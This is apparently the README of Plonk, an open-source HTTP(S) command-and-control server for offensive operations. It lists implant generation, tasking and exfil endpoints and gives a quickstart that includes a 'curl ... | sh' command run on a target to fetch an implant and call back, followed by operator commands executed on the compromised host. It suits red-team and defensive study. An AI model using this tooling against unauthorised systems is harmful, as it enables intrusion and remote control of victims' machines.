Plonk
=====
Plonk is a no-frills HTTP(s)-based C2 server, intended to be very easy to set
up and use but also powerful enough for real, if simple, ops.

### Features
1. Very simple [protocol](./doc/protocol.md) which handles...
   1. [Tasking](./doc/protocol.md#tasking-t)
   2. [Task Output](./doc/protocol.md#output-o)
   3. [Exfil Upload](./doc/protocol.md#exfil-p)
   4. [Implant Generation](./doc/protocol.md#implant-generation-c)
   5. [Static File Serving](./doc/protocol.md#static-files-f)
2. Fairly simple [setup](#singleplayer-quickstart) and
   [configuration](./doc/config.md)
3. Multiplayer-friendly, with reasonably simple
   [setup](./doc/multiplayer.md)
4. [TLS](./doc/tls.md) by default, with [Let's Encrypt](https://letsencrypt.org)
   or a self-signed certificate.  Or both.
5. More than zero [documentation](./doc)

Please see the [changelog](./doc/changelog.md) for a log of changes.

Singleplayer Quickstart
-----------------------
Make sure you have [Go](https://go.dev/doc/install) installed.

```sh
# Install Plonk itself.  This can be done on another host, so long as plonk
# is in PATH on the server or the rest of this section is adjusted accordingly.
go install github.com/magisterquis/plonk@v0.0.1-beta.1
# Did it work?
plonk -v

# Start it going
nohup plonk -server -https-address 0.0.0.0:4433 >/dev/null 2>&1 &
# Or get rid of -https-address and add -letsencrypt-domain for better TLS if a
# domain name is pointed at Plonk.

# Did it work?
ls "$HOME/plonk.d/"                 # Populated directory exists?
# Should see:
#     files  log.json  op.sock  state.json
tail "$HOME/plonk.d/log.json"       # Log looks ok?  tail -f is also neat.
# Log will tell you everything's happy:
#     {"time":"2023-12-29T22:45:27.206057004Z","level":"INFO",
#     "msg":"Server ready","dirname":"/home/h4x/plonk.d"}
curl -svk https://127.0.0.1:4433/c  # Implant generation works?
# Should see a shell script with a couple of
#     curl -k -pinnedpubkey "sha256//..."
# lines, calling back to 127.0.0.1.

# Get a callback
curl -sk https://<plonk>:4433/c | sh  # On target and with a better URL,
                                      # of course.  
                                      # Don't use -k if Plonk was started with
                                      # -letsencrypt-domain
tail -n2 "$HOME/plonk.d/log.json"     # Get the callback?  May need more -n.
# Log should say an implant was generated and something called back, like:
#    {"time":"2023-12-29T22:52:02.235811943Z","level":"INFO",
#     "msg":"Implant generation","parameters":{
      "PubkeyFP":"1oOI5fF7U7bLSVythHfk0COUNvymV0aoWfTT1puBfIk=","RandN":"57i",
#     "URL":"https://[REDACTED]:4433"},"sni":"","host":"[REDACTED]:4433",
#     "method":"GET","remote_address":"[REDACTED]:32260","url":"/c"}
#    {"time":"2023-12-29T22:52:02.280309985Z","level":"INFO",
#     "msg":"New implant","id":"57i-target.my.domain-9924"}

# Interact with the target
plonk  # Connect to the server as an operator
# A nice welcome message should appear
#     ___________________________
#    /     Welcome to Plonk!     \
#    \ Try ,help to get started. /
#     ---------------------------
#            \   ^__^
#             \  (oo)\_______
#                (__)\       )\/\
#                    ||----w |
#                    ||     ||
#    2023/12/29 22:53:26 [OPERATOR] Connected: h4x0r (cnum:1)
#    (plonk)>
,list  # See what's called back
# Should be the same ID as in the log output from above:
#    ID                         From        Last Seen
#    --                         ----        ---------
#    57i-target.my.domain-9924  [REDACTED]  2023-12-29T22:54:42Z (4.939s)
,seti 57i-target.my.domain-9924 # Interact with our target, but with the right ID
# Timestamps are handy to work out what happens and when, turns out.
#    2023/12/29 22:58:37 Interacting with 57i-target.my.domain-9924
#    2023/12/29 22:58:37 Use ,logs to return to watching Plonk's logs
ps awwwfux  # Run a command on target
# Plonk is HTTP-based; we get notified when the task is queued, send, and run
#    2023/12/29 22:58:42 [TASKQ] Task queued by h4x0r for 57i-target.my.domain-9924 (qlen 1)
#    ps awwwfux
#    2023/12/29 22:58:43 [CALLBACK] Sent task to 57i-target.my.domain-9924 (qlen 0):
#    ps awwwfux
#    2023/12/29 22:58:43 [OUTPUT] From 57i-target.my.domain-9924
#    USER       PID %CPU %MEM   VSZ   RSS TT  STAT   STARTED       TIME COMMAND
#    root         1  0.0  0.0   948   104 ??  I      Sat01AM    0:01.01 /sbin/init
#    root     30130  0.0  0.0  1112    24 ??  Ip     Sat01AM    0:00.00 - /sbin/slaacd
#    _slaacd  83001  0.0  0.0  1108    24 ??  Ip     Sat01AM    0:00.00 |-- slaacd: engine (slaacd)
#    _slaacd  55365  0.0  0.0  1128    24 ??  IpU    Sat01AM    0:00.00 `-- slaacd: frontend (slaacd)
#    ...
```

Directory
---------
Plonk's directory (settable with `-dir` at runtime or
[baked-inable](./doc/config.md#compile-time-settable-defaults) with
`-ldflags "-X main.DefaultDir"` at compile time) is where it keeps all of the
files it needs, i.e.:

File/Subdirectory | Description
------------------|------------
`exfil/`          | Exfil sent to [`/p`](./protocol.md#exfil-p)
`files/`          | Static files, accessible via [`/f`](./doc/protocol.md#static-files-f)
`implant.tmpl`    | Optional [implant template](./doc/protocol.md#implant-generation-c)
`index.html`      | Optional default [response body](./doc/config.md#indexhtml)
`log.json`        | Server logs
`op.sock`         | Operator Unix socket, used by Plonk the client
`sate.json`       | Server's persistent state
